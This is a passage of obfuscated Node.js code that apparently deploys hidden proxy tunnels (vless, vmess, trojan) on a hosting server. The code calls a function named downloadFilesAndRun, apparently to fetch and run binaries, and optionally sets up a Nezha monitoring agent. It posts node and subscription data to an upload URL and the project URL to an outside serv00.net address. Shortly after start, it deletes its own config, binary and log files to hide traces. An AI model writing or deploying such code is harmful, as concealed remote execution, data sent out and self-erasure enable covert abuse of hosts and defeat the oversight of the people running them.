_0x260c35={_0x40e61c:0x1b3,_0x480331:0x22f,_0x5daa5b:0x21a,_0x1e040b:0x240},_0x243cd6=_0x5772,_0x4b337d={'v':'2','ps':''+_0x4f03c,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x243cd6(_0x32a88f._0x2a8549),'net':'ws','type':_0x243cd6(_0x32a88f._0x2a8549),'host':_0x206508,'path':_0x243cd6(0x200),'tls':_0x243cd6(_0x32a88f._0x401b67),'sni':_0x206508,'alpn':'','fp':'firefox'},_0x3bdf5e='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x243cd6(0x255)+_0x206508+'&fp=firefox&type=ws&host='+_0x206508+_0x243cd6(_0x32a88f._0x51b708)+_0x4f03c+_0x243cd6(_0x32a88f._0x3ff3e3)+Buffer['from'](JSON[_0x243cd6(0x216)](_0x4b337d))['toString'](_0x243cd6(_0x32a88f._0x53cfca))+'\x0a\x20\x20\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x243cd6(0x1b5)+_0x206508+_0x243cd6(0x1cd)+_0x206508+_0x243cd6(_0x32a88f._0x54bba8)+_0x4f03c+'\x0a\x20\x20\x20\x20';console[_0x243cd6(0x242)](Buffer[_0x243cd6(_0x32a88f._0x589478)](_0x3bdf5e)[_0x243cd6(_0x32a88f._0x4bef9a)](_0x243cd6(0x1b3))),fs['writeFileSync'](subPath,Buffer[_0x243cd6(_0x32a88f._0x589478)](_0x3bdf5e)[_0x243cd6(_0x32a88f._0x4bef9a)](_0x243cd6(_0x32a88f._0x53cfca))),console[_0x243cd6(0x242)](FILE_PATH+_0x243cd6(0x20b)),uploadNodes(),app[_0x243cd6(_0x32a88f._0x19c00b)]('/'+SUB_PATH,(_0x47c77f,_0x4f861a)=>{const _0xb89da5=_0x243cd6,_0x4038b3=Buffer[_0xb89da5(0x1a2)](_0x3bdf5e)[_0xb89da5(0x1d7)](_0xb89da5(_0x260c35._0x40e61c));_0x4f861a[_0xb89da5(_0x260c35._0x480331)](_0xb89da5(_0x260c35._0x5daa5b),'text/plain;\x20charset=utf-8'),_0x4f861a[_0xb89da5(_0x260c35._0x1e040b)](_0x4038b3);}),_0xadf2e1(_0x3bdf5e);},0x7d0);});}}async function uploadNodes(){const _0x30437f={_0x57a5c2:0x1b8,_0xe1cd97:0x1ab,_0x25d060:0x24f,_0x2daf0f:0x207,_0x74292b:0x20c,_0x373fa6:0x242},_0x5d3567=_0x542c58;if(UPLOAD_URL&&PROJECT_URL){const _0x2b50cb=PROJECT_URL+'/'+SUB_PATH,_0x254d2a={'subscription':[_0x2b50cb]};try{const _0x3e6352=await axios[_0x5d3567(0x203)](UPLOAD_URL+_0x5d3567(_0x30437f._0x57a5c2),_0x254d2a,{'headers':{'Content-Type':_0x5d3567(_0x30437f._0xe1cd97)}});return _0x3e6352&&_0x3e6352[_0x5d3567(0x1bd)]===0xc8?(console['log']('Subscription\x20uploaded\x20successfully'),_0x3e6352):null;}catch(_0x2345eb){if(_0x2345eb['response']){if(_0x2345eb[_0x5d3567(_0x30437f._0x25d060)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x5d3567(0x1ef)](listPath))return;const _0x4fecea=fs[_0x5d3567(_0x30437f._0x2daf0f)](listPath,_0x5d3567(0x19a)),_0x583ea4=_0x4fecea[_0x5d3567(0x230)]('\x0a')[_0x5d3567(_0x30437f._0x74292b)](_0x3b90b0=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x3b90b0));if(_0x583ea4[_0x5d3567(0x1f6)]===0x0)return;const _0x2f4a1b=JSON[_0x5d3567(0x216)]({'nodes':_0x583ea4});try{const _0xd4ea38=await axios[_0x5d3567(0x203)](UPLOAD_URL+_0x5d3567(0x236),_0x2f4a1b,{'headers':{'Content-Type':_0x5d3567(_0x30437f._0xe1cd97)}});return _0xd4ea38&&_0xd4ea38[_0x5d3567(0x1bd)]===0xc8?(console[_0x5d3567(_0x30437f._0x373fa6)]('Nodes\x20uploaded\x20successfully'),_0xd4ea38):null;}catch(_0x199304){return null;}}else return;}}function cleanFiles(){const _0x8d435e={_0x27abf4:0x25b,_0x23745a:0x1d6,_0x4247ff:0x239},_0x272edb={_0x5f2a3b:0x1f9,_0x3934ae:0x242,_0x24013f:0x226},_0x8f2429={_0x75f486:0x1f9,_0x38beb2:0x1a1,_0x33e615:0x226};setTimeout(()=>{const _0x462c1a=_0x5772,_0x47cdc2=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x47cdc2[_0x462c1a(0x1a4)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x47cdc2[_0x462c1a(0x1a4)](phpPath);process['platform']===_0x462c1a(0x212)?exec(_0x462c1a(_0x8d435e._0x27abf4)+_0x47cdc2['join']('\x20')+'\x20>\x20nul\x202>&1',_0x484914=>{const _0x4c1b42=_0x462c1a;console[_0x4c1b42(_0x8f2429._0x75f486)](),console[_0x4c1b42(0x242)](_0x4c1b42(_0x8f2429._0x38beb2)),console['log'](_0x4c1b42(_0x8f2429._0x33e615));}):exec(_0x462c1a(_0x8d435e._0x23745a)+_0x47cdc2['join']('\x20')+_0x462c1a(_0x8d435e._0x4247ff),_0x2bae92=>{const _0x23a32d=_0x462c1a;console[_0x23a32d(_0x272edb._0x5f2a3b)](),console[_0x23a32d(_0x272edb._0x3934ae)](_0x23a32d(0x1a1)),console[_0x23a32d(0x242)](_0x23a32d(_0x272edb._0x24013f));});},0x15f90);}cleanFiles();function _0x5772(_0x1c5d83,_0x302897){const _0x531444=_0x5314();return _0x5772=function(_0x57723f,_0x597512){_0x57723f=_0x57723f-0x198;let _0x4f608c=_0x531444[_0x57723f];return _0x4f608c;},_0x5772(_0x1c5d83,_0x302897);}async function AddVisitTask(){const _0x41449e={_0x382f7d:0x242,_0x5de466:0x1c1,_0x98d726:0x242},_0x53e8a8=_0x542c58;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x53e8a8(_0x41449e._0x382f7d)](_0x53e8a8(_0x41449e._0x5de466));return;}try{const _0x2df521=await axios[_0x53e8a8(0x203)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x53e8a8(_0x41449e._0x98d726)](_0x53e8a8(0x1e2)),_0x2df521;}catch(_0x4cfd9f){return console[_0x53e8a8(0x23e)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x4cfd9f['message']),null;}}async function startserver(){const _0x52dfa9={_0x23efb0:0x23e},_0x5d6d54=_0x542c58;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x34462d){console[_0x5d6d54(_0x52dfa9._0x23efb0)]('Error\x20in\x20startserver:',_0x34462d);}}startserver()[_0x542c58(0x24d)](_0x5891fc=>{const _0x140abc={_0x288347:0x1b9},_0x547cb7=_0x542c58;console[_0x547cb7(0x23e)](_0x547cb7(_0x140abc._0x288347),_0x5891fc);}),app['listen'](PORT,()=>console[_0x542c58(0x242)](_0x542c58(0x1ee)+PORT+'!'));
